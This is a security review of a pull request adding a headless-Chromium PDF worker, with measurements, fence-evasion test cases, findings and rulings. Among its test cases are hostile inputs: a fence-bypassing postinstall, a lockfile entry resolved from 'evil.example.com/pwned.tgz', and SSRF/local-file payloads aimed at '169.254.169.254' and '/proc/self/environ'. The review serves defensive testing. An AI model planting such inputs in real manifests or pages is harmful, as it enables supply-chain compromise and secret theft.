# Sec joint-review — PR #634 (SELF-348 / A4) at frozen sha 3c449cc
Reviewer: security-engineer-2 (independent of the concurrent A9 Sec instance). 2026-09-05.
Worktree: /Users/mosko/Projects/mosko-fintech-worktrees/security-engineer-2 (detached @ 3c449cc).

## Verdict: AMBER

Merge-blocking: F-11 and D-1 (below). Everything else rides.

---

## Measurements run (command · predicate · result)

| # | Command | Predicate | Result |
|---|---|---|---|
| M1 | `bash scripts/ci/fence-rt22-pdf-worker-dockerfile.sh workers/pdf-render/Dockerfile` | rc==0 | rc=0 |
| M2 | `bash scripts/ci/fence-rt22-pdf-worker-manifest.sh workers/pdf-render/package.json` | rc==0 | rc=0 |
| M3 | `bash scripts/ci/fence-admission-private-bind.sh workers/pdf-render/docker-compose.yaml` | rc==0 | rc=0 |
| M4 | same fence vs `tests/fixtures/ci/admission-bind-pdf-render-public-ports.compose.yaml` | rc==1 AND stdout contains `vector 1: published host-port mapping` | rc=1, token count 1 |
| M5 | `grep -nE '^[[:space:]]*(ENV\|ARG)[[:space:]]+SUPABASE_' workers/pdf-render/Dockerfile` | zero hits | rc=1 (zero hits) |
| M6 | `grep -rn SUPABASE workers/pdf-render/` | every hit is a comment line | 11 hits, all comments |
| M7 | node scan of `package-lock.json` | 0 db-ish names; 0 non-`registry.npmjs.org` `resolved`; 0 missing `integrity` | 41 entries, all three predicates hold |
| M8 | `npm ci && node --test test/render.test.js` (PUPPETEER_EXECUTABLE_PATH=local Chrome) | 14/14 pass | 14 pass / 0 fail / 0 skip |
| M9 | `git grep -hoE 'RT-[0-9]{2}' 3c449cc -- .github/workflows/ \| sort -u` vs same on `origin/main` | unchanged | **CHANGED: RT-30 added** |
| M10 | evasion matrix, 11 cases + negative control (below) | F-7/F-8/F-9/F-10 all rc=1; NC rc=0 | held; 3 new passes found |
| M11 | scratch `npm ci --omit=dev` on a manifest with a root `postinstall` | script does NOT run | **script RAN** (marker written) |
| M12 | `grep -rn "workers/pdf-render" .github/workflows/` filtered to non-fence lines | some job runs the battery | **zero — no CI job runs it** |
| M13 | `grep -rin hadolint .github/` | some workflow runs hadolint | **zero hits** |
| M14 | `git log -1 -S 'ENV PDF_WORKER_SIGNING_KEY=${PDF_WORKER_SIGNING_KEY}' -- workers/pdf-render/Dockerfile` | provenance | `eada4b2` (pre-existing, unchanged by this PR) |
| M15 | `grep -n -A4 -B2 PDF_WORKER secrets-manifest.yml` | ci_only ∩ production_only == ∅ | `PDF_WORKER_SIGNING_KEY_TEST` ci_only / `PDF_WORKER_SIGNING_KEY` production_only — **disjoint** |

## Evasion matrix (M10) — `scripts/ci/fence-rt22-pdf-worker-manifest.sh`

| case | shape | expected | rc | verdict |
|---|---|---|---|---|
| NC | the real shipped `package.json` + lockfile | 0 | 0 | negative control OK |
| e1 | `dependencies: {pg}` | 1 | 1 | caught |
| e2 | F-7 tarball-URL alias `"db":"https://registry.npmjs.org/pg/-/pg-8.11.3.tgz"` | 1 | 1 | caught |
| e3 | F-8 `"puppeteer-core":"github:evil/pup"` | 1 | 1 | caught |
| e4 | F-9 nested `overrides: {puppeteer-core:{pg:...}}` | 1 | 1 | caught |
| e5 | F-9 `resolutions: {"**/pg":...}` | 1 | 1 | caught |
| e11 | `peerDependencies: {pg}` | 1 | 1 | caught |
| e6 | `"puppeteer-core":"*"`, `"jsonwebtoken":"latest"` | — | 0 | passes — NOTE only (lockfile pins; `npm ci`) |
| e7 | `bundleDependencies:["pg"]` | — | 0 | passes — NOTE only (npm requires it also in `dependencies`, which e1 catches) |
| **e8** | `scripts.postinstall: "apt-get install -y postgresql-client && npm i pg"` | 1 | **0** | **F-11 — NEW, live (M11 confirms it executes)** |
| **e9** | lockfile entry for allowlisted `jsonwebtoken` with `resolved: https://evil.example.com/pwned.tgz` | 1 | **0** | **F-12 — NEW, prospective** |
| **e10** | lockfile entry `node_modules/harmless` with `resolved: git+ssh://…/pg.git` | 1 | **0** | **F-12, second face** |

---

## Findings

### D-1 (flag, merge condition) — instance-numbering drift, `scripts/ci/README.md`
This PR adds a bullet asserting *"RT-27 is the third catalogued §10 instance"*. The bullet **three lines above it**, unchanged, asserts *"the numbered list stays 2-instance per the discipline-preservation guard."* Both now sit in one list. ADR-011 Decision 4 read live at 3c449cc: *"**§10 catalogued-instance count = 3** — RT-22 first / RT-26 second / RT-27 third."* The `2-instance` figure has been stale since the 2026-07-19 flip; this PR is the surface that makes it self-contradictory, so it is in scope here.

**Commit-ready replacement (DevOps commits verbatim; owner of `scripts/ci/README.md`).** Replace the TBC bullet's second sentence — currently:

> **NOT in Decision 4's catalogued numbered list** — the numbered list stays 2-instance per the discipline-preservation guard.

with:

> **NOT in Decision 4's catalogued numbered list** — TBC is a Privileged-context-surfaces-bullet mechanism, not a catalogued instance, per the discipline-preservation guard; read the list's membership live from ADR-011 Decision 4, never from a count pinned here.

Path B, and it drops a derivable figure rather than correcting it to a new one that will re-stale — matching the convention the RT-22 bullet in the same list already uses (*"read it live, never from a count pinned here"*).

### F-11 (flag, merge condition) — lifecycle scripts bypass the allowlist entirely. Owner: DevOps (fence) or Backend (Dockerfile).
`scripts/ci/fence-rt22-pdf-worker-manifest.sh` parses `dependencies` / `devDependencies` / `optionalDependencies` / `peerDependencies` / `overrides` / `resolutions`. It does not read `scripts`. Measured (M11): `npm ci --omit=dev` **runs the root package's `postinstall`**, and the Dockerfile's line 85 `RUN npm ci --omit=dev` carries no `--ignore-scripts`, so dependency lifecycle scripts run too. A `"postinstall": "apt-get install -y postgresql-client && npm i pg"` installs a Postgres client with the fence reporting `CLEAN` (e8, rc=0) and the Dockerfile fence blind (it greps RUN verbs, not the manifest).

This voids the flip's own stated guarantee — *"Adding a new dependency requires an entry here — that review IS the control (Sec F-4 Option B)"* — and the success message *"every dependency allowlisted with a plain registry spec"*, both of which are true only of the six fields actually scanned.

Two remediations, either sufficient; **A is stronger, B is cheaper**:

- **A — Dockerfile (Backend).** `RUN npm ci --omit=dev --ignore-scripts`. Closes the class at the install site for the root package AND every dependency, not just the six manifest fields. Safe here: `puppeteer-core` has no install script (that is `puppeteer`, which downloads a browser); `jsonwebtoken` has none. **Losing side:** if a future allowlisted dependency needs a build step, it silently no-ops rather than failing loudly — so pair it with the existing `docker build` path staying green as the observer.
- **B — fence (DevOps).** Add a seventh manifest source: assert `manifest.scripts`' key set ⊆ `{start,test}` and contains no `preinstall`/`install`/`postinstall`/`prepare`/`prepublish`/`prepack`. Catch criterion: e8's manifest must exit 1 with a token naming the script key. Golden fixture: `tests/fixtures/ci/rt22-manifest-lifecycle-script.package.json`, inversion step asserts the specific token per the F-2 discipline already used in this PR.
- **C — both.** My recommendation: A closes it, B makes the closure visible in review.

### F-12 (flag, not merge-blocking) — the lockfile half is denylist-only; the `resolved` URL is unchecked. Owner: DevOps.
The fence header states this plainly (*"The LOCKFILE side is UNCHANGED (denylist + all three evasion signals…)"*), so it is a known asymmetry rather than an oversight — but it is the half that decides what `npm ci` actually installs. e9: a lockfile entry for the allowlisted `jsonwebtoken` whose `resolved` points at an arbitrary host passes `CLEAN`. e10: an arbitrary git-sourced package under a benign folder name passes — `nameFromResolved()` returns null for a git URL, so no candidate is tested. Either could bundle a Postgres client inside itself with no separate lockfile entry for the denylist to see. **Not live: M7 shows the shipped lockfile clean on all three predicates.**

Catch criterion for the fix: for every `lock.packages` entry with a `resolved` field, assert `resolved` matches `^https://registry\.npmjs\.org/` **and** `integrity` is present. Both predicates already hold on the shipped lockfile (M7), so this lands green and bites only on regression. ~5 lines; no golden-fixture cost beyond one violation fixture per predicate.

### F-13 (flag) — three controls in this PR have no committed watcher, and the PR body says otherwise. Owner: Backend.
The PR body's test plan reads *"14 tests against real Chromium incl. a `docker build` smoke (healthz, render, fence, nonce replay, **signing key absent from all 9 Chromium child environments**)."* Measured: `workers/pdf-render/test/` contains exactly one file, 14 tests (M8), and **none** of them is a `docker build` smoke, a `/healthz` test, or a child-process-environment assertion. `grep -rniE "docker|healthz|environ|child" workers/pdf-render/test/` returns four hits, all inside the `file:///proc/self/environ` payload string and comments.

So `_childEnvWithoutSecrets()` in `render.js:74` — the second, independent control that the "one abort, not two" discharge partly leans on — can be deleted or regressed with nothing red. The measurement was real; it just is not in the tree.

Catch criterion: a test that launches the browser via `getBrowser()`, enumerates the Chromium process tree's `/proc/<pid>/environ` (Linux-only; gate on `process.platform === 'linux'` and **fail** rather than skip when the gate is off in CI), and asserts `PDF_WORKER_SIGNING_KEY` appears in none. Plus a `/healthz` 200 test. Owner: Backend; QA if it is homed with P10's legs.

**Separately, the PR body should be corrected before F/CTO ratify** — it is the artifact the sign-off reads.

### F-14 (flag) — no CI job runs the worker's battery at all. Owner: DevOps.
M12: zero non-fence references to `workers/pdf-render` in `.github/workflows/`. M13-adjacent: the only `working-directory` values across all workflows are `.`, `api`, `workers/etl`, `workers/provider-sync`. `worker-ci.yml` is pinned to `workers/provider-sync` by `defaults.run.working-directory`. So the resource-loading fence — a Sec condition adopted with the R2 ruling — ships with **local-only** verification.

Mitigating, and it is why this is not merge-blocking: `scheduled-dep-audit.yml` enumerates via `git ls-files '*package.json'`, so `workers/pdf-render` is auto-discovered for `npm audit` with no wiring (verified). And AC 4b homes the two catch-criterion legs at **P10**. But P10 is a later issue, and the battery Backend wrote here goes unrun until then.

Options: (a) add a `pdf-render` job to `worker-ci.yml` mirroring the provider-sync `unit` job, with `PUPPETEER_EXECUTABLE_PATH` set from an installed Chromium — run-always, no `paths:` filter, per that file's own header; (b) leave it to P10 and accept the interim gap explicitly. I recommend (a); (b) is defensible if P10 is imminent.

⚠ Whichever is chosen: `render.test.js:25-28` self-skips into a **passing** test when `PUPPETEER_EXECUTABLE_PATH` is unset. If it is wired to CI as-is and the env var is not set, the job goes green having run nothing — a false green from an unvalidated instrument. Require: in CI the unset case must **fail**, not skip.

### F-15 (flag) — compose declares 8082; the process listens on 8080. Owner: DevOps.
`docker-compose.yaml:66-67` is `expose: ["8082"]` and its comment block asserts the endpoint is reachable at `http://pdf-render:8082`. `Dockerfile:89` is `EXPOSE 8080` and `server.js:21` is `PORT = Number(process.env.PORT || 8080)`; the compose `environment:` sets `NODE_ENV` and `PDF_WORKER_SIGNING_KEY` only — no `PORT`. Both halves of the mismatch are new in this PR (M14-adjacent: `EXPOSE 8080` is an added line).

RT-27's own predicate is unaffected — `expose:` is declarative in Compose and the fence's real assertion is the **absence** of `ports:`/host-network/proxy-label, which holds (M3/M4). But a reviewer reading a green RT-27 result alongside this manifest reads *"the admission surface is 8082, expose-only"*, and that sentence is false: the listener is on 8080. Fix: add `- PORT=8082` to the compose `environment:` list, or align `expose:`/`EXPOSE` to 8080. Also: the comment *"pending A5 landing the real render-endpoint listener"* is stale inside its own PR — A4 landed the listener.

### F-16 (flag) — the Chromium apt pin freezes the largest attack surface in the container. Owner: DevOps + Backend.
`Dockerfile:53-56` pins `chromium=152.0.7977.75-1~deb12u1` and `fonts-liberation=1:1.07.4-11` for hadolint DL3008. Two consequences, and only the second is in the Dockerfile's comment: (i) rebuilds no longer pick up Chromium security updates — on a container whose entire job is running a browser engine over network-supplied HTML, that is the one package where currency dominates reproducibility; (ii) the build breaks outright once Debian rotates the superseded version out of the archive, converting a security-patch event into a red build whose repair ("bump the pin") looks like routine maintenance.

⚠ And the lint the pin exists to satisfy has **no CI watcher**: M13 finds zero `hadolint` occurrences under `.github/`, and `.husky/pre-commit:153` soft-skips with a WARN when hadolint is not installed — while `.husky/pre-commit:43` asserts *"CI (security-scan.yml / hadolint, …)"* backs it. That CI stage does not exist. (Pre-existing, not this PR's file — but it is the premise the pin rests on.)

Options: (a) unpin `chromium` only, keep `fonts-liberation` pinned, and suppress DL3008 with an inline `# hadolint ignore=DL3008` carrying the reason — trades reproducibility for patch currency on the one package where I would make that trade; (b) keep the pin and add a scheduled job that fails when the pinned version is no longer the bookworm candidate, so the rotation is caught as a finding rather than as a red build; (c) keep as-is and accept. I recommend (a) or (b); I do not require either at this merge. **I did not run a Docker build, so I have not verified the pin currently resolves.**

### F-17 (flag) — `--no-sandbox` residual, and where it actually lands. Owner: DevOps.
`render.js:57-58` disables Chromium's own renderer sandbox; Backend flagged it explicitly rather than slipping it in, and named container namespace isolation as the compensating control. **I accept the tradeoff** on three measured grounds: the container holds exactly one secret (M6/M15), that secret is stripped from Chromium's environment (`render.js:74`), and the container has zero DB reach (M5/M6/M7).

Residual, stated because the compensating control is narrower than it reads: a renderer compromise reaches container-level code execution, and the **Node** process's environment still holds `PDF_WORKER_SIGNING_KEY`. The Dockerfile has no `USER` directive, so both run as root at the same UID and `/proc/<node-pid>/environ` is readable. `USER node` does not separate them (still one UID). The cheap controls that do bite are compose-level: `cap_drop: [ALL]` and `security_opt: ["no-new-privileges:true"]`. Alternative: restore Chromium's sandbox by supplying a seccomp profile instead of `--no-sandbox`. Neither is required at this merge; the first is two lines.

### F-18 (flag, mechanism real / reachability chained) — WebSocket and WebRTC are outside CDP request interception. Owner: Backend, proof leg at P6.
The fence aborts every non-`data:` **request**. Puppeteer's `setRequestInterception` covers the Fetch/Network domain; it does not cover WebSocket handshakes or RTCDataChannel. JavaScript is enabled on the page (no `setJavaScriptEnabled(false)`, no `--disable-javascript`), so a script in the posted HTML could open an outbound `ws://` or data channel, receive bytes, write them into the DOM, and have them painted into the PDF — the exact outcome AC 4b's second half forbids ("neither the signing key nor any fetched content").

**Reachability is chained, not direct:** the poster must hold a valid 60 s token, i.e. it is our own app, so this needs an XSS in the app's Svelte template first — which is AC 5's upstream control and whose proof leg is already homed at P6. So this is not a live path today.

Strongest fix, and it removes the whole class rather than the two known members: `page.setJavaScriptEnabled(false)` before `setContent`. The report HTML is Svelte-rendered finished markup and a print stylesheet needs no script — but I do not know whether any chart or layout step is client-side, so **the feasibility call is Backend's/Architect's, not mine.** If JS must stay on, I ask instead that P6's inert-`<script>` leg be widened from *"markup renders escaped"* to *"script does not execute"* — the two are different assertions and only the second watches this.

### N-1 (note) — SD-20's `ONLY` is not enforced by the verifier.
`auth.js` requires `users_id`, `iat`, `nonce` and reads no others; a token carrying additional claims verifies. SD-20's *"users_id claim ONLY"* is a **minting-side** shape constraint and the verifier need not enforce it — harmless while nothing downstream reads any other claim, which `server.js:63`'s `void auth` makes true today. Recorded so a future consumer of a second claim is recognised as the change that makes this matter. **I do NOT require strict-claim-set enforcement.**

### N-2 (note) — the nonce sweep horizon is shorter than the acceptance window, under exactly the skew the window exists to tolerate.
`auth.js:150` accepts `-60 ≤ (now − iat) ≤ 60` — a **120 s wide** acceptance span. `auth.js:63-68` sweeps a nonce when `now − seenAt > 60`, where `seenAt` is first-seen wall-clock, not `iat`. Replay is possible iff a token was first used **before its own `iat`** — i.e. when the signing app's clock leads the worker's by δ, giving a δ-second replay window after the sweep evicts the nonce. Bounded by δ and by RT-27 private-bind (an attacker must already be on the project network to capture the token). Not live; recorded because the fix is one line and the reasoning is easy to lose.

Fix: store `_seenNonces.set(decoded.nonce, decoded.iat)` and sweep on `now − iat > FRESHNESS_WINDOW_SECONDS`, which makes the sweep predicate exactly the acceptance predicate's positive side. Equivalent alternative: sweep at `2 * FRESHNESS_WINDOW_SECONDS` from first-seen.

Also note the canonical text is one-sided — RT-21 (c): *"JWTs with `iat` > 60s in the past rejected."* The implementation additionally rejects a far-future `iat`, so it is a **strict tightening** of the catalog clause, not drift. Good; keep it.

### N-3 (note) — stale-direction assertions surviving in the (C) tree.
- `Dockerfile:6-8` still reads *"Puppeteer browser-context-per-render hitting V1 app `/internal/pdf-render` under short-lived signed JWT"* — the retired (A) direction, in a file whose body correctly describes (C). Owner: Backend. In-PR fix.
- `workers/pdf-render/.env.example` (not in this PR's diff, pre-existing) reads *"The PDF worker reaches the data layer ONLY via the V1 web-app's `/internal/pdf-render` endpoint"* — under (C) it reaches the data layer not at all, and that path is retired. Owner: whoever holds the R14 doc PR; out of scope to require here.
- `docker-compose.yaml:36-38` *"pending A5 landing the real render-endpoint listener"* — see F-15.
- `auth.js:8` quotes *"the referent moves"* and attributes it to *"RT-21 letter (f)"*. The phrase is real but its source is `docs/records/v15-preflight/rederived-acs.md:209` § SELF-349 3(f), which renders it **bold, upper-case**: *"the REFERENT MOVES."* SECURITY §4.5's RT-21 (f) contains no such phrase. So the attribution points at the catalog entry rather than at the re-derivation, and the source's emphasis is dropped. Cosmetic; cite the records file (which `auth.js:2` already names) instead of the letter.

### N-4 (note) — unpinned specs pass the allowlist.
e6: `"puppeteer-core":"*"` / `"jsonwebtoken":"latest"` are allowlisted names with plain-registry specs and pass `CLEAN`. `npm ci` installs from the lockfile, so this is not an install-path hazard today. Recorded only because the fence's message says *"pinned by a plain registry semver spec"* and `*` satisfies the character allowlist while pinning nothing.

---

## Rulings

### R-1 — the R2.2 catch criterion's "two aborts": **the literal 2 is STRUCK; the criterion is DISCHARGED as measured.** I do NOT require a second `https:` vector.
Criterion verbatim (`docs/records/v15-preflight/sitting-log.md` § R2, Sec's two conditions, condition 1):

> …renders a PDF containing neither the signing key nor any fetched content, AND the interception handler records two aborts (a failed fetch and a blocked fetch render identically, so "the PDF looks fine" is vacuous).

The parenthetical is the criterion's **rationale**, and the numeral was my arithmetic over my own two-vector payload — arithmetic that assumed both vectors reach interception. They do not: Chromium refuses the `file://` iframe under its own local-resource policy before any request event fires. **That is my error, in my own criterion, and Backend measured it correctly.** I reproduced it independently at M8: one abort, on the `http://169.254.169.254/` vector.

What the rationale actually demands is a control that **discriminates a blocked fetch from a failed one**. A second `https:` vector does not supply that — it increments the same counter over the same code path, adding a number rather than a fact. Backend shipped three legs that do:
- `render.test.js:175` — a **locally reachable** `http://` target whose content is independently known to be fetchable; abort count 1 and the content absent from the PDF. This is the positive control the rationale asks for.
- `render.test.js:141` — `file://` attributed to Chromium's own policy, asserted **separately** rather than folded into the count. Attributing it to the interception handler would have been the wrong-mechanism claim.
- `render.test.js:197` — `data:` URIs **not** aborted, count 0. The discriminating negative control: without it, a handler that aborts unconditionally would pass every other leg.

That set is stronger than the "2" I wrote. Discharged.

⚠ **One condition, and it is not on this merge.** The literal "two aborts" also sits in `rederived-acs.md` § SELF-348 AC 4b, which says *"Both legs live at P10."* If P10's battery is written from that text it will assert `abortedCount === 2` and go RED against correct behaviour — and the tempting repair for that red is to change the fence, not the assertion. **The AC 4b and sitting-log R2.2 wording must be corrected at their canonical anchor before P10 is built.** Owner: Architect / team-lead (records files). Replacement wording:

> **Catch criterion (Sec, adopted at the ruling; numeral corrected 2026-09-05 at the A4 joint-review).** POST HTML containing `<iframe src="file:///proc/self/environ">` and `<img src="http://169.254.169.254/">`; assert the returned PDF contains **neither the signing key nor any fetched content**, AND assert the interception handler **aborted the `http://` vector** — measured as **one** abort, not two: Chromium refuses the `file://` iframe under its own local-resource policy before any request event fires, so that vector never reaches interception and is asserted separately against the mechanism that actually refuses it. ⚠ Asserting only *"the PDF looks fine"* is **vacuous — a failed fetch and a blocked fetch render identically** — so the abort assertion must be paired with a **positive control** (a locally reachable `http://` target, proving the abort is a blocked fetch and not a failed one) and a **negative control** (a `data:` URI, proving the handler is not aborting unconditionally).

### R-2 — RT-21 (g), routed to Sec at build: **DISCHARGED by the shipped stderr reason-code emission. No storage surface is owed at the worker, and none may be created there.**
RT-21's body leaves (g)'s storage surface open and warns against reasoning from RT-05's resemblance; ADR-050 F3 records it as inheriting RT-05's defect unbuilt; the named surface `pfin.plaid_sync_audit` was dropped at `015`. Under R2 (C) the rejecting party moved: it is now the **worker**, and the worker has **zero DB reach** — a standing veto (D-1, Lock 13 mod #2, no exception). A row-per-event audit surface at the rejecting party is therefore not merely undesirable, it is **structurally unavailable**, and proposing one would be proposing to give the PDF worker a database client. `server.js:52` + `auth.js`'s fixed reason-code enum (`missing_authorization_header`, `malformed_authorization_header`, `signature_verification_failed`, `malformed_payload`, `missing_users_id_claim`, `missing_iat_claim`, `missing_nonce_claim`, `stale_token`, `nonce_replay`, `signing_key_not_configured`) is bounded, carries no attacker-controlled content, and reaches the container log stream. That is the correct and only available signal here.

Note, not a requirement: if a durable rejection ledger is wanted later, its home is the **app** side — the minting party, which has DB reach — at A5. It is not owed by this PR.

If team-lead judges (g)'s home to be A5's review rather than A4's build, this ruling carries forward unchanged.

### R-3 — SD-20 as JWT/HS256: **confirmed as SD-20's meaning, not an invention.**
SD-20 supplies "JWT" and "60s freshness" and "verifies signature + freshness + nonce" in its own words. HS256 follows from the shape SD-20 and the manifest jointly describe: a **single** `PDF_WORKER_SIGNING_KEY`, held by both the V1 web-app and the PDF worker (`secrets-manifest.yml:127` — *"V1 web-app + PDF worker (SD-20)"*), used to sign on one side and verify on the other. A shared symmetric secret with JWT is HMAC; RT-21 (b)'s "dedicated signing key" names no asymmetric key material anywhere. The explicit `algorithms: ["HS256"]` allowlist at `auth.js:122` is the correct realisation and is what makes RT-21 (a) survive as a key restriction. Verified red at `render.test.js:288` (`alg:none`) and `:255` (wrong key).

### R-4 — PDF metadata scrub, best-effort with a documented compressed-object-stream limit: **ACCEPTABLE. Not a condition. I do NOT require pdf-lib.**
Three grounds. (i) The leak class is a caller-supplied `<title>` echoing into the Info dictionary — and under (C) the caller is our own app, so the "leaked" metadata is content the app already placed in the PDF body; this is tidiness, not confinement. (ii) The scrub is measured against **this** pipeline's actual output (`render.test.js:212`), not assumed — the honest scope. (iii) A third runtime dependency would enlarge the very allowlist the RT-22 manifest fence exists to hold at two, trading a documented cosmetic limit for a real supply-chain surface. The length-preserving implementation is also correct on the point that matters (xref offsets), and the escaped-paren walk at `render.js:206-238` handles the `\\)` / `\)` distinction properly.

Record the limit as a posture item in SECURITY at the R14 doc PR; do not gate this merge on it.

### R-5 — the `⟨OPEN⟩` on the claim set (`users_id` vs opaque id): **NOTED, NOT RULED.** It is A5's to propose, per `rederived-acs.md` § SELF-349 AC 6 and per this review's brief. Recorded only: `server.js:63`'s `void auth` and `auth.js`'s never-read-the-value discipline mean **either** resolution is a drop-in at A5 with no change to this worker's logic — the surface is deliberately indifferent to the answer, which is the right shape for an open question.

---

## Verify-hook — three axes over the changed README / workflow comments / fence headers

Read live from `DECISIONS.md` at 3c449cc: ADR-011 Decision 17 (Lock 13, mods #2 and #7) and Decision 4 (Privileged-context-surfaces bullet, the Catalogued §10 instances bullet, the three-class composition, the attribution-discipline CHANGELOG, and the 2026-09-03 SELF-257 amendment).

- **(i) instance-numbering — DRIFT.** See D-1. One site: `scripts/ci/README.md`. Everything else is correct: the added README bullet, `security-scan.yml:721-724`, and `fence-rt22-pdf-worker-manifest.sh:82-85` each state ledger-effect-NONE without asserting a count.
- **(ii) layer-attribution — CLEAN.** README: RT-22 = infrastructure-credential-presence; RT-26 = code-layer; RT-27 = network-exposure/config. All three match Decision 4 verbatim. The fence header attributes its own extension to RT-22 (the infrastructure-credential-presence instance) — correct. No surface is called "four-layer" anywhere. No layer moves.
- **(iii) verbatim-vs-paraphrase — CLEAN on every quotation of Lock/RT/fence text.** `fence-rt22-pdf-worker-manifest.sh:15-16` quotes the Dockerfile fence's *"COPY of package.json / requirements.txt manifests (install intent revealed at RUN time, not COPY time; manifest inspection is human-second-line)"* — byte-checked against `fence-rt22-pdf-worker-dockerfile.sh:21-22`, exact. Lock 13 mod #7's flag string `--disable-features=BackgroundFetch,ServiceWorker,BackgroundSync` matches Decision 17 verbatim at `render.js:49`. **RT-30 is cited by POINTER at both sites** (`security-scan.yml:725`, `scripts/ci/README.md:53`) — `grep -n 'RT-30'` over the whole changed set returns exactly those two, both prose pointers. **The pre-sitting draft's false-composite quotation was NOT restored.** Confirmed. Residual, cosmetic only: N-3's `auth.js:8` attribution.

## CI-fenced RT set — the brief's premise is wrong; correcting it
`git grep -hoE 'RT-[0-9]{2}' <ref> -- .github/workflows/ | sort -u`:
- `origin/main`: RT-05 RT-22 RT-26 RT-27
- `3c449cc`: RT-05 RT-22 RT-26 RT-27 **RT-30**

**The set CHANGED.** The brief states it should not. The addition is a **comment-cited pointer** at `security-scan.yml:725` (the ledger-effect-NONE note), not a new fence job — and the grep returns comment-cited labels **by design and must not be tightened** to exclude them. So: coverage is intra-instance as the brief says, and the *grep-defined fenced set* still grew. Both are true; the second is the one the standing rule cares about.

⚠ **§10 CATALOGUED = {RT-22, RT-26, RT-27} (count 3, read live from ADR-011 D4). CI-FENCED = {RT-05, RT-22, RT-26, RT-27, RT-30}. These are DIFFERENT SETS and must never be reconciled.** They now differ by two labels rather than one, which makes the distinction easier to see and correspondingly easier to "clean up". Do not.

## Explicit non-objections
- I do **NOT** require a second `https:` interception vector (R-1).
- I do **NOT** require a PDF library / third dependency for metadata scrubbing (R-4).
- I do **NOT** require strict-claim-set enforcement on the JWT (N-1).
- I do **NOT** require a per-worker `npm audit` CI job — `scheduled-dep-audit.yml`'s `git ls-files` enumerator auto-discovers `workers/pdf-render/package.json`; verified.
- I do **NOT** object to the pass-if-absent retirement (ruling E17). Verified fail-closed both ways: fence exit 2 on a missing target, workflow `exit 1` on zero manifests found, with no fallback branch remaining.
- I do **NOT** object to `--no-sandbox` (F-17) — accepted with the residual named.
- I do **NOT** object to `node:22-bookworm-slim` or to the `puppeteer-core` 25.10.0 / `jsonwebtoken` 9.0.2 pair. `npm audit` reports 0 vulnerabilities; 41 lockfile entries, all `registry.npmjs.org`-resolved with `integrity`.
- I do **NOT** object to the ARG/ENV secret-in-build-arg shape at `Dockerfile:61-62`. It is pre-existing (`eada4b2`, M14), AC item 1 forbids restructuring the block because the RT-22 fence keys on it, and the compose passes no `build.args` so the live path never populates it. Recorded as a standing item for whenever that fence criterion is next revisited — not this PR's.
- Secrets manifest: **no overlap.** `PDF_WORKER_SIGNING_KEY_TEST` (ci_only) and `PDF_WORKER_SIGNING_KEY` (production_only) are distinct names in disjoint sets.
- Nothing here triggers a veto: no §10 ledger weakening, no secrets-store overlap, no DB reach for the PDF worker, no SECURITY DEFINER, no Decision 3 change, no fence weakened (both RT-22 fences and RT-27 are strengthened).

## My own errors in this review
1. My first grep for the `"the referent moves"` quote was **case-sensitive** and returned only `auth.js`, which I initially read as a fabricated quotation attributed to RT-21. The phrase is real — `rederived-acs.md:209`, rendered `the REFERENT MOVES`. Caught by re-running case-insensitively before writing the finding. The finding survives only as the cosmetic N-3 attribution note.
2. The "two aborts" in my own R2.2 catch criterion was wrong (R-1). It assumed both vectors reach interception; the `file://` one does not. Backend measured it correctly and I reproduced their measurement.

---
---

# ADDENDUM — re-review at f5f0354 then 6fbcec5 (2026-09-05)

**Verdict unchanged: AMBER. Both merge conditions (F-11, D-1) remain open and are untouched by either delta.**

## Scoping claims, independently verified (not relayed)

`git diff --name-only 3c449cc 6fbcec5` = exactly 6 files: `tests/fixtures/ci/README.md`, the two `lockfile-transitive/` fixture files, `workers/pdf-render/src/auth.js`, `src/server.js`, `test/auth.test.js`.

`git diff --name-only 3c449cc 6fbcec5 -- scripts/ci/ .github/ workers/pdf-render/Dockerfile workers/pdf-render/docker-compose.yaml workers/pdf-render/package.json workers/pdf-render/package-lock.json workers/pdf-render/src/render.js` → **EMPTY**. So no fence script, no workflow, no Dockerfile, no compose manifest, no dependency manifest and no `render.js` moved across either delta. Both scoping claims hold.

**CI-fenced RT set at `6fbcec5`** = RT-05 RT-22 RT-26 RT-27 RT-30 — identical to `3c449cc`. The correction I filed against the brief's premise still stands and is unchanged by these two commits: the set grew by RT-30 (comment pointer) between `main` and `3c449cc`, and has not moved since. §10 CATALOGUED remains {RT-22, RT-26, RT-27}. **Different sets; do not reconcile.**

## Re-measurements at 6fbcec5 (all re-run, not carried forward)

| Predicate | Result |
|---|---|
| RT-22 Dockerfile fence | rc=0 |
| RT-22 manifest fence, production target | rc=0 |
| RT-27 production, pdf-render compose | rc=0 |
| RT-27 inversion, pdf-render golden | rc=1, `vector 1: published host-port mapping` present |
| RT-22-manifest inversion, `manifest-direct/` | rc=1, token `manifest:dependencies:pg` present |
| RT-22-manifest inversion, `lockfile-transitive/` | rc=1, token `lockfile:pg` present, **`grep -c 'manifest:'` = 0** — isolation assertion restored |
| `render.test.js` (real Chromium) | 14 pass / 0 fail / 0 skipped |
| `auth.test.js` (new) | 6 pass / 0 fail / 0 skipped |
| D-1 open? `grep -c "numbered list stays 2-instance" scripts/ci/README.md` | 1 — **still open** |
| F-11 open? `grep -c '"scripts"' fence-rt22-…-manifest.sh` / `grep -c 'ignore-scripts' Dockerfile` | 0 / 0 — **still open**; the e8 postinstall fixture still exits rc=0 |

## f5f0354 — the E21 fixture adaptation

**The security substance at 3c449cc is unchanged by this delta.** Nothing under `workers/`, `scripts/ci/` or `.github/` moved; the fence's rule, the workflow's assertions and the production manifest are byte-identical. What changed is one golden fixture's manifest half and its two README rows.

The adaptation is **correct, and the failure it repairs is a real one I should name for what it is**: E4's isolation assertion is *"this fixture proves the lockfile route fires independently"*, and once the fence flipped to allowlist-enforcement, `objection-lite` tripped `manifest:dependencies:objection-lite(not-allowlisted)` on its own — so the fixture was asserting isolation while no longer having it. **The CI red was the watcher working**, not an inconvenience: the workflow's `if echo "$out_lockfile" | grep -q 'manifest:'` leg is precisely the guard that catches a fixture silently regaining a manifest-side trip, and it caught this one. Ruling E21 (keep the assertion, adapt the fixture) is the right disposition — the alternative, relaxing the isolation assertion to tolerate an incidental extra token, would have destroyed the only thing the fixture exists to prove. Verified above: the token now fires and the `manifest:` count is 0.

